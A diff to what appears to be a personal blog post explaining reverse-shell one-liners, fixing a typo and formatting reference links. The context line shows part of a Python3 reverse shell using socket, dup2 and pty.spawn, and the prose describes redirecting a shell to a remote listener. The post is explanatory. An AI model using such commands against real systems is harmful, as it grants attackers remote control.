@@ -74,11 +74,11 @@ python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socke
 
 For Perl and Python3, they are just writing a simple scripts on the command line with the `-e` or `-c` flag, mainly using the Sockets. The flow of the script is mainly to initialise a connection socker, redirect stdin to stdout, and stdout and stderr to listener. Then have an interactive session of /bin/sh.
 
-These are more obvious in the Bash version, where we can see redirectrs in stdin, stdout or stderr used. A [better][ref_2] explanation is given on StackOverflow. Thats all for today, time to continue enjoying the holidays a little.
+These are more obvious in the Bash version, where we can see redirects in stdin, stdout or stderr used. A [better][ref_2] explanation is given on StackOverflow. Thats all for today, time to continue enjoying the holidays a little.
 
 [ref_1]: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php
 [ref_2]: https://stackoverflow.com/questions/24793069/what-does-do-in-bash
 
 ### References
-1. https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php
-2. https://stackoverflow.com/questions/24793069/what-does-do-in-bash
+1. [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php)
+2. [What $ means](https://stackoverflow.com/questions/24793069/what-does-do-in-bash)
